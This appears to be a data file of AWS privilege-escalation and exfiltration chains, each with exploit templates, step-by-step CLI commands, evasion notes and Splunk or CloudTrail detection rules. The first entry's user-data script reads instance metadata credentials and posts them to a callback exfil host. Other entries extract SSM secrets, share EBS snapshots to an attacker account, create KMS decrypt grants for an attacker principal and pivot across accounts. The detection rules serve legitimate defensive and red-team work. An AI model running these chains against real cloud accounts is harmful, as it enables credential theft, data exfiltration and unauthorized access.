chains.exploit_template: aws iam list-instance-profiles && aws ec2 run-instances --image-id ami-xxx --instance-type t3.micro --iam-instance-profile Arn=ADMIN_PROFILE_ARN --user-data '#!/bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME > /tmp/creds && curl http://CALLBACK/exfil -d @/tmp/creds'
steps: aws iam list-instance-profiles -- find instance profile with admin role

aws ec2 run-instances --image-id ami-xxx --instance-type t3.micro --iam-instance-profile Arn=ADMIN_PROFILE_ARN --user-data '#!/bin/bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME > /tmp/creds && curl http://CALLBACK/exfil -d @/tmp/creds'
Wait for user data to execute -- receive credentials at callback URL
chains.notes: Only works if instance can reach IMDS (IMDSv1) or attacker can access instance directly. Detect by correlating RunInstances events where requestParameters.iamInstanceProfile contains admin profile ARN.

chains.name: CrossAccount Pivot via Trust Chain
chains.permission_scope: access to an external account trusted by a role in the target account
chains.exploit_template: aws iam list-roles && aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCT:role/TRUSTED_ROLE --role-session-name pivot
steps: aws iam list-roles -- find roles with Principal containing external account ARNs or wildcard
From external account: aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCT:role/TRUSTED_ROLE --role-session-name pivot
Use assumed role to access resources or chain to additional role assumptions within target account
chains.splunk_detection: index=cloudtrail eventName=AssumeRole | where requestParameters.roleArn like "%TARGET_ACCT%" AND userIdentity.accountId!="TARGET_ACCT"
chains.notes: Check for role chaining — the assumed role may be able to assume additional roles. Detect by filtering AssumeRole events where the requestParameters.roleArn is in target account AND userIdentity.accountId is external.

chains.name: SSM Parameters -> Secrets -> Access
chains.permission_scope: SecureString SSM parameters containing credentials or API keys
chains.exploit_template: aws ssm describe-parameters && aws ssm get-parameter --name /prod/db/password --with-decryption
steps: aws ssm describe-parameters -- find SecureString parameters (names suggesting DB credentials, API keys, tokens)
aws ssm get-parameter --name /prod/db/password --with-decryption -- extract secret value
Use extracted credential to access RDS, external APIs, or pivot to other systems
chains.splunk_detection: index=cloudtrail eventName=GetParameter | where requestParameters.withDecryption=true AND (requestParameters.name like "%password%" OR requestParameters.name like "%secret%" OR requestParameters.name like "%key%")
chains.notes: If GetParameter is denied, try GetParameterHistory — IAM policies often fail to restrict it separately. Detect by filtering GetParameter events where withDecryption=true on sensitive parameter name patterns.

chains.name: EBS Snapshot Exfiltration
chains.permission_scope: EBS snapshots owned by target account
chains.exploit_template: aws ec2 describe-snapshots --owner-ids self && aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --operation-type add --user-ids ATTACKER_ACCOUNT_ID
steps: aws ec2 describe-snapshots --owner-ids self -- find snapshots
aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --operation-type add --user-ids ATTACKER_ACCOUNT_ID
From attacker account: aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a -- attach to EC2 -- mount -- access disk contents (may contain credentials, keys, database files)
chains.notes: Disk contents may contain credentials, private keys, database files. Detect by filtering ModifySnapshotAttribute events where requestParameters.createVolumePermission.add contains external account IDs.

chains.name: KMS Grant Bypass
chains.permission_scope: KMS key protecting Secrets Manager secrets, EBS volumes, or S3 SSE-KMS objects
chains.exploit_template: aws kms list-keys && aws kms list-grants --key-id KEY && aws kms create-grant --key-id KEY --grantee-principal arn:aws:iam::ACCT:user/ATTACKER --operations Decrypt GenerateDataKey
steps: aws kms list-keys && aws kms list-grants --key-id KEY -- understand existing grants and what data the key protects
aws kms create-grant --key-id KEY --grantee-principal arn:aws:iam::ACCT:user/ATTACKER --operations Decrypt GenerateDataKey
Use grant token to decrypt: Secrets Manager secrets encrypted with this key, EBS volumes using this key, S3 objects with SSE-KMS using this key
chains.notes: KMS grants bypass IAM policy entirely — the grant is on the key itself, not the caller's identity policy. Detect by filtering CreateGrant events where requestParameters.granteePrincipal is unexpected or non-service principal.
